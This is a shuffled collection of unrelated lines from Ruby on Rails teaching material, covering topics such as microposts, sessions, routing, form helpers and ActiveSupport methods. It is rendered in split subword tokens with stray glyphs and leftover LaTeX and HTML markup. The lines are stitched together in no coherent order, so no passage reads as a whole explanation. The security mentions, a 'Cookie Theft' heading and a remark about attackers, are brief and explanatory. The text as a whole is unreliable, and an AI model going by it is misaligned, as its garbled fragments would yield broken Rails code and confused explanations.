▁ Don ' t ▁worry ▁about ▁exactly ▁how ▁the ▁\ k ode { t } ~ object ▁manage s ▁to ▁do ▁this ; ▁the ▁be a u t y ▁of ▁\ emph { abs tr action ▁layer s } ▁is ▁that ▁we ▁don ' t ▁have ▁to ▁know .
▁### ▁G r o up ing ▁ Conditional ▁validations
▁A ▁mockup ▁of ▁a ▁profile ▁page ▁with ▁microposts .
▁from ▁Listing ~\ ref { code : basic _ signup _ tests } ▁to
▁d ▖ advance ( years : ▁1, ▁ months : ▁1, ▁day s : ▁1, ▁hours : ▁1, ▁minutes : ▁1, ▁second s : ▁1)
▁< li >`: sendmail `, ▁can ▁be ▁configured ▁by ▁using ▁` config ▖ action _ mailer ▖ sendmail _ settings ` ▖ </ li >
▁With ▁the ▁` new ` ▁method ▁defined ▁in ▁` Article sController `, ▁if ▁you ▁refresh ╼ < http :// localhost :3000/ articles / new > ▁you ' ll ▁see ▁another ▁error :
▁<%= ▁f ▖ label ▁: author _ name ▁%>< br >
▁[] ▖ sum ▁# ▁=> ▁0
▁* ▁` test _ framework ` ▁defines ▁which ▁test ▁framework ▁to ▁use ▖
▁R ight ▁now ▁\ emph { all } ▁users ▁are ▁displayed ▁on ▁the ▁user ▁index ▁page ▁at ▁ / users ▁and ▁are ▁ visible ▁via ▁the ▁URL ▁ / users / : id , ▁but ▁it ▁make s ▁sense ▁to ▁show ▁users ▁only ▁if ▁they ▁are ▁ activated .
▁Because ▁we ' ll ▁be ▁using ▁an ▁\ k ode { edit } ▁action , ▁we ▁could ▁include ▁\ k ode { edit } ▁on ▁the ▁command ▁line , ▁but ▁this ▁would ▁also ▁generate ▁both ▁an ▁edit ▁view ▁and ▁a ▁test , ▁ n either ▁of ▁which ▁we ' ll ▁turn ▁out ▁to ▁need .
▁Before ▁writing ▁any ▁code , ▁let ' s ▁ mock ▁up ▁the ▁expected ▁ sequence ▁for ▁reset ting ▁passwords .
▁| ▁GET ▁| ▁ / comments / : id (▖ : format ) ▁| ▁comments # show ▁| ▁ sekret _ comment _ path ▁|
▁On ▁my ▁system , ▁I ▁ha d ▁to ▁install ▁the ▁following ▁( using ▁\ href { http :// m x c l ▖ github ▖ com / home brew /}{ Home brew }, ▁a ▁package ▁manage ment ▁system ▁for ▁OS ~ X ) :
▁C an ▁be ▁set ▁to ▁` nil ` ▁for ▁no ▁logging ▖
▁is e ' ▁id =' ex - ad 9 fd 0 ' ></ span >╼╼ \ end { enumerate }╼╼ ╼ ▁% ▁subsection ▁signup _ error _ messages ▁( end )╼╼ ╼ ▁\ subsection { A ▁test ▁for ▁invalid ▁submission } ▁% ▁( fold )╼ ▁\ label { sec : a _ test _ for _ invalid _ submission }╼╼
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁23:2 0 : 05 ▁UTC ▁+00:00
▁For ▁example , ▁if ▁you ' re ▁running ▁code ▁in ▁an ▁` Admin Product sController ` ▁that ▁live s ▁in ▁` app / controllers / admin `, ▁you ▁can ▁render ▁the ▁results ▁of ▁an ▁action ▁to ▁a ▁template ▁in ▁` app / views / products ` ▁this ▁way :
▁ u c to r ▁using ▁the ▁\ k ode { Range } ▁class ▁and ▁the ▁\ k ode { new } ▁method ? ▁\ emph { Hint } : ▁\ k ode { new } ▁take s ▁two ▁arguments ▁in ▁this ▁context ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 7 3 1 58 e ' ></ span >╼╼ ▁\ item ▁C on fi rm ▁using ▁the ▁\ k ode {==} ▁operator ▁that ▁the ▁literal ▁and ▁named ▁construct or s ▁from ▁the ▁previous ▁two ▁ exercises ▁are ▁identical ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 4 d 8 c 3 d ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁construct or s ▁( end )╼╼ ▁\ subsection { Class ▁inheritance } ▁% ▁( fold )╼ ▁\ label { sec : a _ class _ of _ our _ own }╼╼
▁Article ▖ none ▁# ▁returns ▁an ▁empty ▁ Relation ▁and ▁fire s ▁no ▁queries .
▁In ▁Rails , ▁this ▁can ▁be ▁accomplish ed ▁with ▁\ text tt { rails ▁destroy } ▁followed ▁by ▁the ▁name ▁of ▁the ▁generated ▁element .
▁L o t s ▁of ▁little ▁benefit s ▁really ▁add ▁up .
▁Ruby ▁has ▁its ▁own ▁id io sy n c ra s ies , ▁so ▁those ▁will ▁likely ▁be ▁new , ▁too .
▁The ▁method ▁` extract !` ▁remove s ▁and ▁returns ▁the ▁key / value ▁pair s ▁matching ▁the ▁given ▁keys .
▁### ▁ Template s
▁To ▁store ▁the ▁user ' s ▁id ▁in ▁the ▁cookies , ▁we ▁could ▁follow ▁the ▁pattern ▁used ▁with ▁the ▁\ k ode { session } ▁method ▁( Listing ~\ ref { code : log _ in _ function }) ▁using ▁something ▁like
▁We ▁can ▁commit ▁the ▁result ing ▁change ▁as ▁follows :
▁On ▁each ▁page , ▁the ▁application ▁could ▁simply ▁call
▁<% ▁if ▁pages ▖ many ?
▁NOTE : ▁The ▁actual ▁rendering ▁is ▁done ▁by ▁ subclasses ▁of ▁` ActionView :: Template H and ler s ` ▖
▁These ▁changes ▁will ▁ensure ▁that ▁all ▁articles ▁have ▁a ▁title ▁that ▁is ▁at ▁least ▁f ive ╼ character s ▁long ▖
▁This ▁means ▁that ▁we ▁have ▁to ▁create ▁a ▁new ▁\ k ode { app / views / shared } ▁directory ▁using ▁\ k ode { mkdir } ▁( Table ~\ ref { table : uni x _ commands }) :
▁If ▁a ▁value ▁isn ' t ▁set ▁for ▁` config ▖ active _ support ▖ d eprecation ` ▁then ▁this ▁initializer ▁will ▁pro mp t ▁the ▁user ▁to ▁configure ▁this ▁line ▁in ▁the ▁current ▁environment ' s ▁` config / environments ` ▁file ▖
▁in ▁Listing ~\ ref { code : user _ pages _ spec } ▁and
▁If ▁the ▁application ▁does ▁not ▁use ▁the ▁asset ▁pipeline , ▁to ▁include ▁the ▁ jQuery ▁JavaScript ▁library ▁in ▁your ▁application , ▁pass ▁`: default s ` ▁as ▁the ▁source ▖
▁In ▁order ▁to ▁have ▁account ▁activation ▁mean ▁something , ▁we ▁need ▁to ▁allow ▁users ▁to ▁log ▁in ▁only ▁if ▁they ▁are ▁ activated .
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁Name ▁can ' t ▁be ▁blank
▁In ▁this ▁case , ▁the ▁host ▁application ▁doesn ' t ╼ ne ed ▁to ▁require ▁` admin ▖ css ` ▁or ▁` admin ▖ js ` ▖
▁( T hanks ▁to ▁reader ▁\ href { http :// get satisf action ▖ com / railstutorial / to p ic s / adding _ methods _ to _ built _ in _ classes _ com p ar able _ to _ using _ javascripts _ proto type _ object } { E ri k ▁E ld r id ge } ▁for ▁point ing ▁this ▁out ▖)
▁### ▁ Form Options Helper
▁# ▁=> ▁[" I ▁a m ▁ David ", ▁" I ▁a m ▁ Jeremy ", ▁" I ▁a m ▁ J o se "]
▁Be ing ▁able ▁to ▁sign ▁up ▁users ▁is ▁a ▁major ▁mil est one ▁for ▁our ▁application .
▁( end )╼╼ ▁\ subsection { C re ating ▁and ▁ authenticating ▁a ▁user } ▁% ▁( fold )╼ ▁\ label { sec : creating _ and _ authenticating _ a _ user }╼╼
▁Oh ▖▖▖"
▁<%= ▁raw ▁@ cm s ▖ current _ template ▁%> ▁<% # ▁insert s ▁@ cm s ▖ current _ template ▁as ▁is ▁%>
▁Return s ▁` select ` ▁and ▁` option ` ▁tags ▁for ▁the ▁collection ▁of ▁existing ▁return ▁values ▁of ▁` method ` ▁for ▁` object ` ' s ▁class .
▁When ▁your ▁Rails ▁application ▁receive s ▁an ▁in com ing ▁request ▁for :
▁alias _ method ▁: process , ▁: process _ with _ stringified _ params
▁If ▁we ▁were ▁to ▁add , ▁say , ▁an ▁\ k ode { index } ▁action ▁ accessible ▁even ▁to ▁non - signed - in ▁users , ▁we ▁would ▁need ▁to ▁specify ▁the ▁ protected ▁actions ▁explicitly :
▁#### # ▁` beginning _ of _ month `, ▁` end _ of _ month `
▁next _ month
▁On ce ▁you ' ve ▁placed ▁the ▁contents ▁of ▁Listing ~\ ref { code : gemfile _ sqlite _ version } ▁into ▁the ▁application ' s ▁\ k ode { Gemfile }, ▁install ▁the ▁gems ▁using ▁\ k ode { bundle ▁install }
▁Otherwise , ▁the ▁value ▁receive d ▁as ▁argument , ▁which ▁defaults ▁to ▁` nil `, ▁is ▁the ▁ separator :
▁As ▁before , ▁we ' ll ▁use ▁\ k ode { generate } ▁to ▁make ▁the ▁simple st ▁controller ▁that ▁me e t s ▁our ▁present ▁needs , ▁name ly , ▁one ▁with ▁a ▁ stub ▁signup ▁page ▁for ▁new ▁users .
▁</ pre >
▁This ▁hash ▁get s ▁passed ▁to ▁the ▁Users ▁controller ▁as ▁part ▁of ▁\ k ode { params }, ▁and ▁we ▁saw ▁starting ▁in ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁the ▁\ k ode { params } ▁hash ▁contains ▁information ▁about ▁each ▁request ▖ ▁In ▁the ▁case ▁of ▁a ▁URL ▁like ▁ / users /1 , ▁the ▁value ▁of ▁\ k ode { params [: id ]} ▁is ▁the ▁\ k ode { id } ▁of ▁the ▁corresponding ▁user ▁(\ k ode {1} ~ in ▁this ▁example ) .
▁### ▁` exclude ?
▁Client ▖ where (" orders _ count ▁> ▁10 ")▖ reverse _ order
▁# ▁=> ▁Thu , ▁ 05 ▁A ug ▁2010 ▁ 11 : 3 3 : 3 1 ▁+0000
▁ { a : ▁1, ▁b : ▁2}▖ except (: a ) ▁# ▁=> ▁ { : b =>2}
▁* ▁How ▁to ▁interpret ▁the ▁code ▁in ▁` routes ▖ rb ` .
▁ transform _ keys ▁ { ▁| key | ▁key ▖ to _ sy m ▁ rescue ▁key ▁ }
▁Last ▁name ▁: ▁<%= ▁person _ form ▖ text _ field ▁: last _ name ▁%>
▁This ▁step ▁is ▁necessary ▁only ▁if ▁you ' ve ▁changed ▁the ▁version ▁of ▁the ▁Rails ▁gem , ▁which ▁would ▁likely ▁happen ▁only ▁if ▁you ' re ▁using ▁Rails ▁In st all er , ▁but ▁it ▁does ▁no ▁ha rm ▁to ▁run ▁it ▁in ▁other ▁cases ▁as ▁well .
▁Setting ▁ Cloud 9 ▁to ▁use ▁two ▁spaces ▁for ▁indentation .
▁#### ▁Using ▁` render ` ▁with ▁`: inline `
▁Sprockets ▁also ▁set s ▁the ▁` Cache - Control ` ▁HTTP ▁header ▁to ▁` max - age = 3 15 36 000 ` ▖
▁As ▁with ▁ordinar y ▁views , ▁we ▁can ▁use ▁ embedded ▁Ruby ▁to ▁customize ▁the ▁template ▁views , ▁in ▁this ▁case ▁ greeting ▁the ▁user ▁by ▁name ▁and ▁including ▁a ▁link ▁to ▁a ▁custom ▁activation ▁link .
▁The ▁` first ` ▁method ▁find s ▁the ▁first ▁record ▁order ed ▁by ▁the ▁primary ▁key ▖
▁Then ▁you ▁make ▁the ▁` app / views / articles / show ▖ html ▖ erb ` ▁look ▁like ▁the ▁following :
▁# ▁< contributors >
▁If ▁we ▁only ▁need ▁to ▁update ▁a ▁single ▁attribute , ▁using ▁the ▁ singular ▁\ k ode { update \_ attribute } ▁by pass es ▁this ▁restrict ion :
▁Using ▁ idiomatic ally ▁correct ▁code ▁to ▁build ▁a ▁micropost ▖
▁Setting ▁\ k ode {@ current \_ user } ▁to ▁\ k ode { nil } ▁would ▁only ▁matter ▁if ▁\ k ode {@ current \_ user } ▁were ▁created ▁before ▁the ▁\ k ode { destroy } ▁action ▁( which ▁it ▁isn ' t ) ▁\ emph { and } ▁if ▁we ▁did n ' t ▁issue ▁an ▁ im media te ▁redirect ▁( which ▁we ▁do ) .
▁The ▁following ▁table ▁ explain s ▁the ▁usage ▁of ▁the ▁loaded ▁middleware s :
▁For ▁more ▁details , ▁including ▁other ▁events ▁you ▁can ▁ bind ▁to , ▁check ▁out ▁[ the ╼ Turbolinks ╼ README ]( https :// github ▖ com / rails / turbolinks / blo b / master / README ▖ md ) .
▁As ▁discuss ed ▁in ▁Section ~\ ref { sec : a _ hashed _ password }, ▁the ▁password ▁digest ▁is ▁created ▁using ▁ bcrypt ▁( via ▁\ k ode { has \_ secure \_ password }), ▁so ▁we ' ll ▁need ▁to ▁create ▁the ▁fixture ▁password ▁using ▁the ▁same ▁method .
▁It ' s ▁ o d d ▁to ▁create ▁a ▁new ▁class ▁just ▁to ▁create ▁a ▁method ▁that ▁take s ▁a ▁string ▁as ▁an ▁argument .
▁# ▁=> ▁Mon ▁Oct ▁ 18 ▁00:00:00 ▁UTC ▁ 1582
▁ Render s ▁a ▁ container ▁tag ▁that ▁ rel ate s ▁to ▁your ▁Active ▁Record ▁Object .
▁Implement ing ▁sessions ▁will ▁involve ▁defin ing ▁a ▁large ▁number ▁of ▁related ▁function s ▁for ▁use ▁a cross ▁multiple ▁controllers ▁and ▁views .
▁ Compar ing ▁Listing ~\ ref { code : demo _ users _ controller _ class } ▁and ▁Listing ~\ ref { code : demo _ microposts _ controller _ class }, ▁we ▁see ▁that ▁both ▁the ▁Users ▁controller ▁and ▁the ▁Microposts ▁controller ▁inherit ▁from ▁the ▁Application ▁controller .
▁D is allow ing ▁double ▁do t s ▁in ▁email ▁domain ▁names ▖
▁With ▁ jQuery , ▁you ' d ▁write ▁something ▁like ▁this :
▁We ' ll ▁see ▁in ▁just ▁a ▁moment ▁the ▁benefit s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }), ▁but ▁first ▁we ' ll ▁add ▁a ▁minimal ▁requirement ▁on ▁password ▁security .
▁If ▁you ▁ append ▁on to ▁a ▁ safe ▁string , ▁either ▁in - p la ce ▁with ▁` concat ` / ` << `, ▁or ▁with ▁` + `, ▁the ▁result ▁is ▁a ▁ safe ▁string ▖
▁H app ily , ▁this ▁problem ▁has ▁already ▁been ▁solve d : ▁in ▁Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }, ▁we ▁created ▁a ▁User ▁record ▁by ▁hand ▁using ▁the ▁Rails ▁console , ▁so ▁there ▁should ▁be ▁one ▁user ▁in ▁the ▁database :
▁Active ▁Record ▁ s up p li es ▁a ▁great ▁deal ▁of ▁functionality ▁to ╼ your ▁Rails ▁models ▁for ▁free , ▁including ▁basic ▁database ▁ CRUD ▁( Create , ▁Read , ▁ Update ,╼ Destroy ) ▁operations , ▁data ▁validation , ▁as ▁well ▁as ▁sophisticat ed ▁search ▁support ╼ and ▁the ▁ability ▁to ▁ rel ate ▁multiple ▁models ▁to ▁one ▁another .
▁A ▁user ▁is ▁logged ▁in ▁if ▁there ▁is ▁a ▁current ▁user ▁in ▁the ▁session , ▁i ▖ e ▖ , ▁if ▁\ k ode { current \_ user } ▁is ▁not ▁\ k ode { nil } .
▁Rails ▁passes ▁the ▁object ▁being ▁added ▁or ▁removed ▁to ▁the ▁callback .
▁The ▁`: source _ type ` ▁option ▁specifie s ▁the ▁source ▁association ▁type ▁for ▁a ▁` has _ one ▁: through ` ▁association ▁that ▁proceed s ▁through ▁a ▁ polymorphic ▁association .
▁A ▁diagram ▁of ▁this ▁hierarchy ▁appears ▁in ▁Figure ~\ ref { fig : static _ pages _ controller _ inheritance } .
▁# ▁return ▁the ▁first ▁user ▁named ▁ David
▁S ince ▁this ▁will ▁involve ▁a ▁minor ▁refactoring , ▁in ▁this ▁section ▁we ' ll ▁write ▁a ▁test ▁to ▁catch ▁any ▁future ▁re gr ess ion s .
▁ AND ▁ locked ▁= ▁? ", ▁params [: orders ] , ▁false )
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁def ▁change
▁For ▁example , ▁if ▁you ▁take ▁a ▁look ▁back ▁at ▁Figure ~\ ref { fig : cloud 9 _ gemfile }, ▁you ' ll ▁see ▁a ▁small ▁vertical ▁line ▁on ▁the ▁right ▁to ▁help ▁keep ▁code ▁under ▁ 80 ▁characters .
▁E xception s
▁#### ▁password _ field _ tag
▁The ▁reason ▁is ▁that , ▁as ▁noted ▁in ▁Section ~\ ref { sec : a _ hashed _ password }, ▁\ k ode { has \_ secure \_ password } ▁enforce s ▁validations ▁on ▁the ▁virtual ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes , ▁but ▁the ▁tests ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } ▁create ▁an ▁\ k ode {@ user } ▁variable ▁without ▁these ▁attributes :
▁ / photos /1/ change
▁validates ▁: name , ▁: login , ▁: email , ▁absence : ▁true
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁sample ▁application ╼╼ This ▁is ▁the ▁sample ▁application ▁for ▁the ╼[ * Ruby ▁on ▁Rails ▁Tutorial : ╼ Learn ▁Web ▁Development ▁with ▁Rails * ]( http :// www ▖ railstutorial ▖ org / )╼ by ▁[ Michael ▁Hartl ]( http :// www ▖ michael hartl ▖ com / ) .
▁For ▁example , ▁the ▁Users ▁controller ' s ▁\ k ode { create } ▁action ▁defines ▁an ▁\ k ode {@ user } ▁variable ▁( Listing ~\ ref { code : user _ signup _ with _ account _ activation }), ▁so ▁we ▁can ▁access ▁it ▁in ▁the ▁test ▁using ▁\ k ode { assigns (: user )} .
▁This ▁ distinct ion ▁won ' t ▁be ▁important ▁in ▁this ▁chapter , ▁but ▁we ' ll ▁learn ▁more ▁about ▁ environments ▁in ▁Section ~\ ref { sec : rails _ environments } .
▁( Listing ~\ ref { code : full _ title _ helper _ tests } ▁uses ▁\ k ode { assert \_ equal ▁< expect ed > , ▁< actual > }, ▁which ▁verifie s ▁that ▁the ▁expected ▁result ▁\ line break ▁matches ▁the ▁actual ▁value ▁when ▁compar ed ▁with ▁the ▁\ k ode {==} ▁operator ▖)
▁With in ▁the ▁` customer ` ▁partial , ▁the ▁` customer ` ▁variable ▁will ▁refer ▁to ▁`@ new _ customer ` ▁from ▁the ▁ parent ▁view .
▁* ▁` after _ add `
▁in ▁Listing ~\ ref { code : respond _ to _ password _ digest } .
▁As ▁usual , ▁we ' ll ▁write ▁tests ▁as ▁we ▁develop , ▁ extending ▁the ▁the me ▁of ▁using ▁RSpec ▁and ▁Capybara ▁to ▁write ▁succinct ▁and ▁express ive ▁integration ▁tests .
▁The ▁` head ` ▁method ▁can ▁be ▁used ▁to ▁send ▁response s ▁with ▁only ▁headers ▁to ▁the ▁browser ▖
▁Ju st ▁like ▁the ▁`: status ` ▁option ▁for ▁` render `, ▁`: status ` ▁for ▁` redirect _ to ` ▁accept s ▁both ▁ numeric ▁and ▁symbol ic ▁header ▁design ation s .
▁A ▁test ▁for ▁ showing ▁microposts ▁on ▁the ▁user ▁\ k ode { show } ▁page .
▁file _ field (: user , ▁: avatar )
▁> ▁ puts ▁ ENV [' DAT A BASE _ URL ']
▁resources ▁: photos , ▁: books , ▁: video s
▁in ▁the ▁feature ▁file ▁get s ▁handle d ▁by ▁the ▁step ▁definition
▁Using ▁a ╼` return ` ▁statement ▁in ▁an ▁ inline ▁callback ▁block ▁cause s ▁a ▁` Local J um p Error ` ▁to ╼ be ▁raised ▁when ▁the ▁callback ▁is ▁executed .
▁root ▁' welcome # index '
▁* ▁` has _ one `
▁orders ▖ empty ?
▁Instead ▁of ▁\ k ode {==} , ▁this ▁uses ▁the ▁boolean ▁method ▁\ k ode { is \_ password ?}\ ▁to ▁perform ▁the ▁compar is on .
▁as ▁seen ▁in ▁Listing ~\ ref { code : relationships _ resource } .
▁If ▁you ' ve ▁been ▁ tail ing ▁the ▁development ▁log , ▁you ▁may ▁have ▁notice d ▁that ▁no ▁new ▁lines ▁have ▁show n ▁up ▁yet .
▁A ▁typical ▁application ▁m ight ▁have ▁a ▁` User ` ▁class ▁that ▁would ▁be ▁used ▁to ▁represent ╼ author s ▁for ▁an ▁article ▁or ▁a ▁comment ▖
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : basic _ login }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }) .
▁If ▁this ▁class ▁contains ▁the ▁foreign ▁key , ▁then ▁you ▁should ▁use ▁` belongs _ to ` ▁instead .
▁You ▁may ▁have ▁notice d ▁some ▁repetition ▁in ▁the ▁Static ▁Pages ▁controller ▁test ▁( Listing ~\ ref { code : title _ tests }) .
▁=> ▁ Abstract Controller :: Base
▁For ▁an ▁attacker , ▁of ▁course , ▁this ▁is ▁not ▁useful , ▁as ▁the ▁victim ▁will ▁see ▁their ▁own ▁cookie ▖
▁If ▁you ▁prefer ▁to ▁learn ▁everything ▁system at ical ly ▁from ▁the ▁ gr ound ▁up , ▁or ▁if ▁you ▁have ▁ never ▁program m ed ▁before , ▁then ▁learning ▁Ruby ▁first ▁m ight ▁work ▁well ▁for ▁you , ▁and ▁in ▁this ▁case ▁I ▁recommend ▁\ href { http :// p ra g prog ▖ com / book / lt p 2 / learn - to - prog ra m }{\ emph { Learn ▁to ▁ Pro gr a m } } ▁by ▁C h ri s ▁P in e ▁and ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P eter ▁Cooper .
▁### ▁Change s ▁to ▁test ▁helper
▁Use ▁this ▁option ▁to ▁prevent ▁name ▁co ll is ion s ▁between ▁routes ▁using ▁a ▁path ▁scope ▖
▁With ▁this ▁code , ▁Active ▁Record ▁automatically ▁returns ▁all ▁the ▁microposts ▁with ▁\ k ode { user \_ id } ▁equal ▁to ▁the ▁id ▁of ▁\ k ode { first \_ user } ▁( in ▁this ▁case , ~\ k ode {1} ) .
▁id : ▁" Home Image ",
▁#### ▁ ERB
▁Validat ing ▁the ▁email ▁format ▁with ▁a ▁regular ▁expression ▖
▁For ▁example ,╼ ▁` attachments [' file - name ▖ jpg '] ▁= ▁File ▖ read (' file - name ▖ jpg ') ` .
▁resources ▁: ads
▁ n ▁class =' exercise ' ▁id =' ex - d f 8 f b d ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁rendering _ microposts ▁( end )╼╼ ▁\ subsection { Sample ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : sample _ microposts }╼╼
▁We ▁can ▁then ▁sign ▁users ▁in ▁automatically ▁by ▁re t ri e v ing ▁the ▁token ▁from ▁the ▁cookie , ▁encrypt ing ▁it , ▁and ▁then ▁search ing ▁for ▁a ▁remember ▁token ▁matching ▁the ▁ encrypted ▁value .
▁* You r ▁Name *
▁Running ▁\ k ode { rails ▁new } ▁to ▁generate ▁a ▁new ▁application .
▁The ▁structure ▁of ▁this ▁section ▁is ▁base d ▁on ▁the ▁excellent ▁blog ▁post ▁\ href { http :// 2 be ar d s ▖ net / 20 11 / 11 / the - rails - 3- asset - pipeline - in - about - 5 - minute s /}{ The ▁Rails ▁3 ▁ Asset ▁Pipeline ▁in ▁( about ) ▁5 ▁M in ute s } ▁by ▁ Michael ▁E ra s m us .
▁#### # ▁ Cookie ▁The f t
▁This ▁doesn ' t ▁matter ▁much ▁for ▁users , ▁but ▁it ▁will ▁for ▁microposts , ▁and ▁we ' ll ▁address ▁this ▁issue ▁further ▁in ▁Section ~\ ref { sec : ordering _ and _ dependency } .
▁ ╼ ▁if ▁boolean ?
▁\ href { https :// tutorial s ▖ rails app s ▖ org / hartl } { Rails App s } : ▁A ▁large ▁variety ▁of ▁ detailed ▁topic - specific ▁Rails ▁ projects ▁and ▁tutorial s
▁### ▁ Form Helper
▁The ▁result ▁is ▁a ▁working ▁status ▁feed ▁on ▁the ▁live ▁Web ▁( Figure ~\ ref { fig : li ve _ status _ feed }) .
▁As ▁noted ▁in ▁the ▁introduction , ▁the ▁\ emph { Rails ▁Tutorial } ▁uses ▁test - driven ▁development ▁( also ▁called ▁test - first ▁development ), ▁which ▁in ▁my ▁view ▁is ▁the ▁best ▁way ▁to ▁develop ▁Rails ▁applications , ▁but ▁it ▁does ▁introduce ▁a ▁substan tial ▁amount ▁of ▁over head ▁and ▁complex ity .
▁has _ many ▁: orders , ▁foreign _ key : ▁" c us t _ id "
▁Tests ▁for ▁the ▁Microposts ▁controller ▁\ k ode { destroy } ▁action .
▁< h 1> Listing ▁articles </ h 1>
▁( Don ' t ▁as k ▁me ▁why ▁the ▁spaces ▁are ▁convention al ; ▁ probably ▁some ▁ early ▁in f l u en tial ▁Ruby ▁programmer ▁like d ▁the ▁look ▁of ▁the ▁extra ▁spaces , ▁and ▁the ▁convention ▁ st u c k ▖)
▁It ' s ▁important ▁to ▁understand ▁that ▁code ▁like ▁that ▁show n ▁in ▁Listing ~\ ref { code : _ format _ jquery _ file _ test } ▁can ' t ▁actually ▁prevent ▁a ▁user ▁from ▁try ing ▁to ▁upload ▁a ▁file ▁that ' s ▁too ▁big .
▁Now ▁it ' s ▁time ▁to ▁install ▁Ruby ▁and ▁Rails .
▁To ▁test ▁for ▁the ▁right ▁count , ▁we ▁can ▁use ▁the ▁same ▁\ k ode { assert \_ match } ▁method ▁we ▁used ▁in ▁Listing ~\ ref { code : user _ profile _ test } ▁to ▁test ▁for ▁the ▁display ▁of ▁the ▁number ▁of ▁microposts ▁on ▁the ▁user ▁profile ▁page .
▁It ▁doesn ' t ▁have ▁any ▁effect s ▁on ▁the ▁application ▁display , ▁though , ▁so ▁short ▁of ▁ inspect ing ▁the ▁browser ▁session ▁directly ▁there ' s ▁no ▁way ▁to ▁tell ▁that ▁you ' re ▁logged ▁in .
▁An ▁ annotate d ▁\ k ode { title \_ helper } .
▁To ▁disable ▁this ▁behavior ▁you ▁can ▁set :
▁attributes ▁= ▁{}) `
▁#### ▁Scopes ▁for ▁` has _ and _ belongs _ to _ many `
▁The ▁ stats ▁in ▁Figure ~\ ref { fig : stats _ partial _ mockup } ▁consist ▁of ▁the ▁number ▁of ▁users ▁the ▁current ▁user ▁is ▁following ▁and ▁the ▁number ▁of ▁followers , ▁each ▁of ▁which ▁should ▁be ▁a ▁link ▁to ▁its ▁respective ▁d ed icated ▁display ▁page .
▁T y p ical ly ▁in ▁Rails , ▁the ▁action ▁that ▁is ▁used ▁for ▁new ▁form ▁submission s ╼ like ▁this ▁is ▁called ▁" create ", ▁and ▁so ▁the ▁form ▁should ▁be ▁point ed ▁to ▁that ▁action .
▁In ▁Rails ▁applications , ▁\ text tt { POST } ▁requests ▁are ▁typical ly ▁used ▁for ▁\ emph { creating } ▁things ▁( a lthough ▁HTTP ▁also ▁allows ▁\ text tt { POST } ▁to ▁perform ▁update s ) ; ▁for ▁example , ▁the ▁\ text tt { POST } ▁request ▁sent ▁when ▁you ▁submit ▁a ▁ registration ▁form ▁creates ▁a ▁new ▁user ▁on ▁the ▁remote ▁site .
▁It ' s ▁recommended ▁that ▁you ▁`: no doc : ` ▁any ▁of ▁your ▁ internal ▁methods / classes ▁unless ▁they ' re ▁already ▁ private ▁( me an ing ▁ v is i b i l ity ), ▁in ▁which ▁case ▁it ' s ▁ internal ▁by ▁default ▖
▁### ▁T ur n ing ▁D ebug g ing ▁Of f
▁ Adding ▁ authorization ▁to ▁the ▁Microposts ▁controller ▁actions ▖
▁Using ▁Rails ' ▁default ▁plural i z ation ▁convention , ▁the ▁set ▁of ▁all ▁users ▁following ▁a ▁given ▁user ▁is ▁that ▁user ' s ▁\ emph { followers }, ▁and ▁\ k ode { user ▖ followers } ▁is ▁an ▁array ▁of ▁those ▁users .
▁In ▁case ▁the ▁` re where ` ▁clause ▁is ▁not ▁used ,
▁This ▁is ▁the ▁ hashed ▁version ▁of ▁the ▁password ▁(\ k ode {" foobar " }) ▁used ▁to ▁ initialize ▁the ▁user ▁object .
▁The ▁improve d ▁\ k ode { README } ▁file ▁ formatted ▁with ▁ Markdown .
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁The ▁name ▁\ emph { digest } ▁comes ▁from ▁the ▁terminology ▁of ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / C ry p to gr a ph ic _ hash _ function } { crypt o gr a ph ic ▁hash ▁function s } .
▁An ▁initializer ▁to ▁skip ▁image ▁ resizing ▁in ▁tests .
▁English
▁The ▁result ing ▁email ▁address ▁will ▁also ▁be ▁un escape d ▁automatically ▁in ▁the ▁controller , ▁and ▁will ▁be ▁available ▁via ▁\ k ode { params [: email ]} .
▁In ▁particular , ▁all ▁other ▁Ruby ▁objects ▁are ▁\ emph { true }, ▁even ▁0 :
▁The ▁users ▁index ▁page ▁shows ▁all ▁users , ▁one ▁page ▁at ▁a ▁time .
▁ W her e ▁a ▁controller ▁generates ╼ content ▁like ▁HTML ▁to ▁send ▁back ▁to ▁the ▁client , ▁a ▁Mailer ▁creates ▁a ▁message ▁to ▁be ╼ deliver ed ▁via ▁email .
▁* ▁` config ▖ con side r _ all _ request s _ local ` ▁is ▁a ▁flag ▖
▁" my _ image - 23 1 a 6 80 f 2 38 87 d 9 d d 7 07 10 ea 5 e fd 3 c 6 2▖ png "} }
▁We ' ve ▁also ▁changed
▁A ▁module ▁may ▁or ▁may ▁not ▁have ▁a ▁name :
▁ Adding ▁image ▁upload ▁involve s ▁two ▁main ▁ visible ▁elements : ▁a ▁form ▁field ▁for ▁upload ing ▁an ▁image ▁and ▁the ▁micropost ▁images ▁themselves .
▁In ▁particular ▁it ▁is ▁very ▁ idiomatic ▁to ▁use ▁a ▁ tr ailing ▁hash ▁for ▁options .
▁config ▖ relative _ url _ root ▁= ▁"/ app 1 "
▁O p en ▁the ▁file ▁` config / routes ▖ rb ` ▁in ▁your ▁editor .
▁ ╼ ▁x ▁= ▁x ▁+ ▁1
